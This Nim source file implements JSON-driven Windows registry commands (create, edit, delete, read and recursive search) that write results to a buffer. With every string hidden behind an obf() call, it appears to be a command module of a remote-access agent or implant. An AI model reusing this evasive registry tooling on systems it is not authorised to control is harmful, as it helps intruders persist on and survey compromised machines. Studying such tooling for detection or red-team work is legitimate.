import std/[base64, json, parseutils, strutils]
import ../utils/global
import ../utils/general/strings
import ../utils/winapi/handlers
import ../utils/winapi/utils
import execution/core

template withRegCmd(params, input, args: string; buf: var openArray[char]; body: untyped): untyped =
  # Parses the registry command json and runs the body
  block:
    let raw =
      if (params).len > 0: (params)
      elif (input).len > 0: (input)
      else: (args)
    if raw.strip().len == 0:
      return writeErr(obf("missing registry parameters (JSON)"), buf)
    try:
      let j {.inject.} = parseJson(raw.strip())
      if j.kind != JObject:
        return writeErr(obf("registry parameters must be a JSON object"), buf)
      body
    except JsonParsingError:
      return writeErr(obf("invalid JSON for registry parameters"), buf)

template hiveFromJson(j: JsonNode): pointer =
  # Reads the registry hive from the json object
  block:
    var h = hkeyLocalMachine
    if j.hasKey(obf("hive")):
      let name = j[obf("hive")].getStr().strip().toUpperAscii()
      if name == obf("HKCR") or name == obf("HKEY_CLASSES_ROOT"):
        h = hkeyClassesRoot
      elif name == obf("HKCU") or name == obf("HKEY_CURRENT_USER"):
        h = hkeyCurrentUser
      elif name == obf("HKLM") or name == obf("HKEY_LOCAL_MACHINE"):
        h = hkeyLocalMachine
      elif name == obf("HKU") or name == obf("HKEY_USERS"):
        h = hkeyUsers
      elif name == obf("HKCC") or name == obf("HKEY_CURRENT_CONFIG"):
        h = hkeyCurrentConfig
    h

template regTypeFromJson(j: JsonNode): culong =
  # Reads the registry value type from the json object
  block:
    var t = regSz
    if j.hasKey(obf("type")):
      let name = j[obf("type")].getStr().strip().toUpperAscii()
      if name == obf("REG_EXPAND_SZ"):
        t = regExpandSz
      elif name == obf("REG_BINARY"):
        t = regBinary
      elif name == obf("REG_DWORD"):
        t = regDword
      elif name == obf("REG_QWORD"):
        t = regQword
    t

proc reg_create*(args, input, params: string; buf: var openArray[char]): int =
  # Creates a registry key and sets a value when present
  withRegCmd(params, input, args, buf):
    if not j.hasKey(obf("path")):
      return writeErr(obf("missing path"), buf)
    let subKey = j[obf("path")].getStr().replace("/", "\\").strip()
    if subKey.len == 0:
      return writeErr(obf("empty path"), buf)
    let hive = hiveFromJson(j)
    var wpath: array[2048, uint16]
    asciiWide(subKey, wpath)
    var hk: pointer = nil
    var disp: culong = 0
    let st = regCreateKeyExW(
      hive, addr wpath[0], 0, nil, regOptionNonVolatile, keyWrite, nil, addr hk, addr disp
    )
    if st != 0:
      return writeErr(obf("RegCreateKeyExW failed"), buf, culong(uint32(int32(st))))
    var msg =
      if disp == 1: obf("Registry key created")
      else: obf("Registry key opened (already exists)")
    if j.hasKey(obf("value")) or j.hasKey(obf("name")):
      let vname =
        if j.hasKey(obf("value")): j[obf("value")].getStr()
        else: j[obf("name")].getStr()
      var wval: array[512, uint16]
      asciiWide(vname, wval)
      let typ = regTypeFromJson(j)
      var payload: seq[byte] = @[]
      if j.hasKey(obf("data")):
        let data = j[obf("data")]
        if typ == regDword:
          var n: uint = 0
          if data.kind == JInt:
            n = uint(data.getInt())
          else:
            discard parseUInt(data.getStr(), n)
          let dw = uint32(n)
          payload = @[byte(dw and 0xFF), byte((dw shr 8) and 0xFF), byte((dw shr 16) and 0xFF), byte((dw shr 24) and 0xFF)]
        elif typ == regQword:
          var n: uint64 = 0
          if data.kind == JInt:
            n = uint64(data.getInt())
          else:
            var u: uint = 0
            discard parseUInt(data.getStr(), u)
            n = uint64(u)
          payload = newSeq[byte](8)
          for i in 0 ..< 8:
            payload[i] = byte((n shr (i * 8)) and 0xFF)
        elif typ == regBinary:
          if data.kind == JString:
            let bin = decode(data.getStr())
            payload = newSeq[byte](bin.len)
            for i, c in bin: payload[i] = byte(ord(c))
        else:
          var ws: array[2048, uint16]
          asciiWide(data.getStr(), ws)
          let wlen = data.getStr().len
          payload = newSeq[byte]((wlen + 1) * 2)
          copyMem(addr payload[0], addr ws[0], payload.len)
      if payload.len > 0:
        let stSet = regSetValueExW(hk, addr wval[0], 0, typ, addr payload[0], culong(payload.len))
        if stSet != 0:
          discard regCloseKey(hk)
          return writeErr(obf("RegSetValueExW failed"), buf, culong(uint32(int32(stSet))))
        msg = msg & obf(" with value set")
    discard regCloseKey(hk)
    writeMsg(msg, buf)

proc reg_edit*(args, input, params: string; buf: var openArray[char]): int =
  # Updates a registry value from the json params
  withRegCmd(params, input, args, buf):
    if not j.hasKey(obf("path")):
      return writeErr(obf("missing path"), buf)
    if not j.hasKey(obf("data")):
      return writeErr(obf("missing data"), buf)
    let subKey = j[obf("path")].getStr().replace("/", "\\").strip()
    if subKey.len == 0:
      return writeErr(obf("empty path"), buf)
    let vname =
      if j.hasKey(obf("value")): j[obf("value")].getStr()
      elif j.hasKey(obf("name")): j[obf("name")].getStr()
      else: ""
    let hive = hiveFromJson(j)
    var wpath: array[2048, uint16]
    asciiWide(subKey, wpath)
    var hk: pointer = nil
    let stOpen = regOpenKeyExW(hive, addr wpath[0], 0, keyWrite, addr hk)
    if stOpen != 0:
      return writeErr(obf("RegOpenKeyExW failed"), buf, culong(uint32(int32(stOpen))))
    var wval: array[512, uint16]
    asciiWide(vname, wval)
    let typ = regTypeFromJson(j)
    let data = j[obf("data")]
    var payload: seq[byte] = @[]
    if typ == regDword:
      var n: uint = 0
      if data.kind == JInt:
        n = uint(data.getInt())
      else:
        discard parseUInt(data.getStr(), n)
      let dw = uint32(n)
      payload = @[byte(dw and 0xFF), byte((dw shr 8) and 0xFF), byte((dw shr 16) and 0xFF), byte((dw shr 24) and 0xFF)]
    elif typ == regQword:
      var n: uint64 = 0
      if data.kind == JInt:
        n = uint64(data.getInt())
      else:
        var u: uint = 0
        discard parseUInt(data.getStr(), u)
        n = uint64(u)
      payload = newSeq[byte](8)
      for i in 0 ..< 8:
        payload[i] = byte((n shr (i * 8)) and 0xFF)
    elif typ == regBinary:
      if data.kind != JString:
        discard regCloseKey(hk)
        return writeErr(obf("REG_BINARY data must be base64 string"), buf)
      let bin = decode(data.getStr())
      payload = newSeq[byte](bin.len)
      for i, c in bin: payload[i] = byte(ord(c))
    else:
      var ws: array[2048, uint16]
      let s = if data.kind == JString: data.getStr() else: $data
      asciiWide(s, ws)
      payload = newSeq[byte]((s.len + 1) * 2)
      copyMem(addr payload[0], addr ws[0], payload.len)
    if payload.len == 0:
      discard regCloseKey(hk)
      return writeErr(obf("empty registry payload"), buf)
    let stSet = regSetValueExW(hk, addr wval[0], 0, typ, addr payload[0], culong(payload.len))
    discard regCloseKey(hk)
    if stSet != 0:
      return writeErr(obf("RegSetValueExW failed"), buf, culong(uint32(int32(stSet))))
    writeMsg(obf("Registry value updated"), buf)

proc reg_delete*(args, input, params: string; buf: var openArray[char]): int =
  # Deletes a registry key or a registry value
  withRegCmd(params, input, args, buf):
    if not j.hasKey(obf("path")):
      return writeErr(obf("missing path"), buf)
    let subKey = j[obf("path")].getStr().replace("/", "\\").strip()
    if subKey.len == 0:
      return writeErr(obf("empty path"), buf)
    let hive = hiveFromJson(j)
    let deleteKey =
      if j.hasKey(obf("delete_key")): j[obf("delete_key")].getBool()
      elif j.hasKey(obf("key")): j[obf("key")].getBool()
      else: false
    let hasValueField = j.hasKey(obf("value")) or j.hasKey(obf("name"))
    let vname =
      if j.hasKey(obf("value")): j[obf("value")].getStr()
      elif j.hasKey(obf("name")): j[obf("name")].getStr()
      else: ""
    if deleteKey:
      var wpath: array[2048, uint16]
      asciiWide(subKey, wpath)
      let st = regDeleteKeyW(hive, addr wpath[0])
      if st != 0:
        return writeErr(obf("RegDeleteKeyW failed"), buf, culong(uint32(int32(st))))
      return writeMsg(obf("Registry key deleted"), buf)
    if not hasValueField:
      return writeErr(obf("specify value/name to delete or set delete_key"), buf)
    var wpath: array[2048, uint16]
    asciiWide(subKey, wpath)
    var hk: pointer = nil
    let stOpen = regOpenKeyExW(hive, addr wpath[0], 0, keySetValue, addr hk)
    if stOpen != 0:
      return writeErr(obf("RegOpenKeyExW failed"), buf, culong(uint32(int32(stOpen))))
    var wval: array[512, uint16]
    asciiWide(vname, wval)
    let st = regDeleteValueW(hk, addr wval[0])
    discard regCloseKey(hk)
    if st != 0:
      return writeErr(obf("RegDeleteValueW failed"), buf, culong(uint32(int32(st))))
    writeMsg(obf("Registry value deleted"), buf)

proc reg_read*(args, input, params: string; buf: var openArray[char]): int =
  # Reads a registry key or value and writes the listing
  withRegCmd(params, input, args, buf):
    if not j.hasKey(obf("path")):
      return writeErr(obf("missing path"), buf)
    let subKey = j[obf("path")].getStr().replace("/", "\\").strip()
    if subKey.len == 0:
      return writeErr(obf("empty path"), buf)
    let vname =
      if j.hasKey(obf("value")): j[obf("value")].getStr()
      elif j.hasKey(obf("name")): j[obf("name")].getStr()
      else: ""
    let hive = hiveFromJson(j)
    let hiveLabel =
      if j.hasKey(obf("hive")): j[obf("hive")].getStr().strip().toUpperAscii()
      else: obf("HKLM")
    var wpath: array[2048, uint16]
    asciiWide(subKey, wpath)
    var hk: pointer = nil
    let stOpen = regOpenKeyExW(hive, addr wpath[0], 0, keyRead, addr hk)
    if stOpen != 0:
      return writeErr(obf("RegOpenKeyExW failed"), buf, culong(uint32(int32(stOpen))))

    proc wideToStr(w: openArray[uint16]; n: int): string =
      # Converts a wide string buffer to text
      var tmp: array[512, char]
      let m = min(n, tmp.len - 1)
      var i = 0
      while i < m and w[i] != 0'u16:
        tmp[i] = char(w[i])
        i += 1
      $cast[cstring](addr tmp[0])

    proc typeLabel(typ: culong): string =
      # Returns the registry type name
      case typ
      of regSz: obf("REG_SZ")
      of regExpandSz: obf("REG_EXPAND_SZ")
      of regBinary: obf("REG_BINARY")
      of regDword: obf("REG_DWORD")
      of regQword: obf("REG_QWORD")
      else: obf("REG_") & $typ

    proc formatValue(typ: culong; data: openArray[byte]; dataLen: int): string =
      # Formats a registry value for display
      if dataLen <= 0:
        return obf("(empty)")
      if typ == regSz or typ == regExpandSz:
        return wideToAscii(addr data[0], culong(dataLen))
      if typ == regDword and dataLen >= 4:
        return $cast[ptr uint32](addr data[0])[]
      if typ == regQword and dataLen >= 8:
        return $cast[ptr uint64](addr data[0])[]
      if typ == regBinary:
        var s = ""
        for i in 0 ..< min(dataLen, 48):
          s = s & toHex(byte(data[i]), 2)
        if dataLen > 48:
          s = s & "..."
        return s
      return obf("<") & $dataLen & obf(" bytes>")

    var lines: seq[string] = @[]
    lines.add(hiveLabel & "\\" & subKey)

    if vname.len > 0 or j.hasKey(obf("value")) or j.hasKey(obf("name")):
      var wval: array[512, uint16]
      asciiWide(vname, wval)
      var typ: culong = 0
      var need: culong = 0
      if regQueryValueExW(hk, addr wval[0], nil, addr typ, nil, addr need) != 0:
        discard regCloseKey(hk)
        return writeErr(obf("RegQueryValueExW failed"), buf)
      var data = newSeq[byte](need.int)
      var dl = need
      if regQueryValueExW(hk, addr wval[0], nil, addr typ, addr data[0], addr dl) != 0:
        discard regCloseKey(hk)
        return writeErr(obf("RegQueryValueExW failed"), buf)
      let dispName = if vname.len > 0: vname else: obf("(Default)")
      lines.add("    " & dispName & "    " & typeLabel(typ) & "    " & formatValue(typ, data, dl.int))
    else:
      var subCnt, valCnt: culong = 0
      if regQueryInfoKeyW(hk, nil, nil, nil, addr subCnt, nil, nil, addr valCnt, nil, nil, nil, nil) == 0:
        var vi = 0'u32
        while vi < valCnt:
          var wname: array[256, uint16]
          var nameLen = culong(wname.len)
          var typ: culong = 0
          var dataLen: culong = 0
          let est = regEnumValueW(hk, vi, addr wname[0], addr nameLen, nil, addr typ, nil, addr dataLen)
          if est == 0x103'u32:
            break
          if est != 0 and est != 0xEA'u32:
            vi += 1
            continue
          let vn = wideToStr(wname, nameLen.int)
          let dispName = if vn.len > 0: vn else: obf("(Default)")
          var valText = obf("(not loaded)")
          if dataLen > 0 and dataLen.int <= 8192:
            var bufData = newSeq[byte](dataLen.int)
            var dl = dataLen
            var wn: array[256, uint16]
            var nl = culong(wn.len)
            if regEnumValueW(hk, vi, addr wn[0], addr nl, nil, addr typ, addr bufData[0], addr dl) == 0:
              valText = formatValue(typ, bufData, dl.int)
          lines.add("    " & dispName & "    " & typeLabel(typ) & "    " & valText)
          vi += 1
        var ki = 0'u32
        while ki < subCnt:
          var wsub: array[256, uint16]
          var subLen = culong(wsub.len)
          let es = regEnumKeyExW(hk, ki, addr wsub[0], addr subLen, nil, nil, nil, nil)
          if es == 0x103'u32:
            break
          if es != 0:
            ki += 1
            continue
          lines.add("    " & wideToStr(wsub, subLen.int))
          ki += 1
    discard regCloseKey(hk)
    if lines.len <= 1:
      lines.add(obf("    (empty key)"))
    writeMsg(lines.join("\n"), buf)

proc reg_search*(args, input, params: string; buf: var openArray[char]): int =
  # Searches the registry and writes the matches
  withRegCmd(params, input, args, buf):
    let needle =
      if j.hasKey(obf("query")): j[obf("query")].getStr()
      elif j.hasKey(obf("search")): j[obf("search")].getStr()
      elif j.hasKey(obf("term")): j[obf("term")].getStr()
      else: ""
    if needle.strip().len == 0:
      return writeErr(obf("missing query"), buf)
    let q = needle.strip()
    let qFold = q.toLowerAscii()
    let fold =
      if j.hasKey(obf("case_sensitive")): not j[obf("case_sensitive")].getBool()
      else: true
    let maxDepth =
      if j.hasKey(obf("max_depth")): j[obf("max_depth")].getInt()
      else: 8
    let maxResults =
      if j.hasKey(obf("max_results")): j[obf("max_results")].getInt()
      else: 64
    let maxValueBytes =
      if j.hasKey(obf("max_value_bytes")): j[obf("max_value_bytes")].getInt()
      else: 2048
    let scanValueData =
      if j.hasKey(obf("search_data")): j[obf("search_data")].getBool()
      else: true
    let rootPath =
      if j.hasKey(obf("path")): j[obf("path")].getStr().replace("/", "\\").strip()
      else: ""
    let hive = hiveFromJson(j)
    let hiveLabel =
      if j.hasKey(obf("hive")): j[obf("hive")].getStr().strip().toUpperAscii()
      else: obf("HKLM")
    var hits: seq[string] = @[]
    var stop = false

    template hitMatch(hay: string): bool =
      # Checks that the text contains the search query
      if fold: hay.toLowerAscii.contains(qFold)
      else: hay.contains(q)

    proc pushHit(line: string) =
      # Stores a match line and stops at the result limit
      if stop:
        return
      hits.add(line)
      if hits.len >= maxResults:
        stop = true

    proc wideToStr(w: openArray[uint16]; n: int): string =
      # Converts a wide string buffer to text
      var tmp: array[512, char]
      let m = min(n, tmp.len - 1)
      var i = 0
      while i < m and w[i] != 0'u16:
        tmp[i] = char(w[i])
        i += 1
      $cast[cstring](addr tmp[0])

    proc walk(hk: pointer; relPath: string; depth: int) =
      # Walks registry keys and collects matches
      if stop or depth > maxDepth:
        return
      if relPath.len > 0 and hitMatch(relPath):
        pushHit(hiveLabel & "\\" & relPath & "  [" & obf("key path") & "]")
      var subCnt, valCnt: culong = 0
      if regQueryInfoKeyW(hk, nil, nil, nil, addr subCnt, nil, nil, addr valCnt, nil, nil, nil, nil) != 0:
        return
      var vi = 0'u32
      while vi < valCnt and not stop:
        var wname: array[256, uint16]
        var nameLen = culong(wname.len)
        var typ: culong = 0
        var dataLen: culong = 0
        let est = regEnumValueW(hk, vi, addr wname[0], addr nameLen, nil, addr typ, nil, addr dataLen)
        if est == 0x103'u32: # ERROR_NO_MORE_ITEMS
          break
        if est != 0 and est != 0xEA'u32: # ERROR_MORE_DATA
          vi += 1
          continue
        let vname = wideToStr(wname, nameLen.int)
        let full = if relPath.len > 0: relPath & "\\" & vname else: vname
        if hitMatch(vname) or hitMatch(full):
          pushHit(hiveLabel & "\\" & full & "  [" & obf("value name") & "]")
        if scanValueData and dataLen > 0 and dataLen.int <= maxValueBytes:
          var bufData = newSeq[byte](dataLen.int)
          var dl = dataLen
          var wn: array[256, uint16]
          var nl = culong(wn.len)
          let rd = regEnumValueW(hk, vi, addr wn[0], addr nl, nil, addr typ, addr bufData[0], addr dl)
          if rd == 0:
            if typ == regSz or typ == regExpandSz:
              let txt = wideToAscii(addr bufData[0], dl)
              if hitMatch(txt):
                var preview = txt
                if preview.len > 120:
                  preview = preview[0 ..< 120] & "..."
                pushHit(hiveLabel & "\\" & full & "  [" & obf("value data") & "] " & preview)
            elif typ == regDword and dl >= 4:
              let n = cast[ptr culong](addr bufData[0])[]
              if hitMatch($n):
                pushHit(hiveLabel & "\\" & full & "  [" & obf("value dword") & "] " & $n)
            elif typ == regQword and dl >= 8:
              let n = cast[ptr uint64](addr bufData[0])[]
              if hitMatch($n):
                pushHit(hiveLabel & "\\" & full & "  [" & obf("value qword") & "] " & $n)
        vi += 1
      var ki = 0'u32
      while ki < subCnt and not stop:
        var wsub: array[256, uint16]
        var subLen = culong(wsub.len)
        let es = regEnumKeyExW(hk, ki, addr wsub[0], addr subLen, nil, nil, nil, nil)
        if es == 0x103'u32:
          break
        if es != 0:
          ki += 1
          continue
        let subName = wideToStr(wsub, subLen.int)
        let childPath = if relPath.len > 0: relPath & "\\" & subName else: subName
        if hitMatch(subName) or hitMatch(childPath):
          pushHit(hiveLabel & "\\" & childPath & "  [" & obf("subkey") & "]")
        var child: pointer = nil
        if regOpenKeyExW(hk, addr wsub[0], 0, keyRead, addr child) == 0 and child != nil:
          walk(child, childPath, depth + 1)
          discard regCloseKey(child)
        ki += 1

    var root: pointer = nil
    var wroot: array[2048, uint16]
    if rootPath.len > 0:
      asciiWide(rootPath, wroot)
      let st = regOpenKeyExW(hive, addr wroot[0], 0, keyRead, addr root)
      if st != 0:
        return writeErr(obf("RegOpenKeyExW failed"), buf, culong(uint32(int32(st))))
    else:
      root = hive
    walk(root, rootPath, 0)
    if rootPath.len > 0 and root != nil:
      discard regCloseKey(root)
    if hits.len == 0:
      return writeMsg(obf("No matches"), buf)
    var report = hits.join("\n")
    if stop:
      report = report & "\n" & obf("(truncated: max_results reached)")
    writeMsg(report, buf)
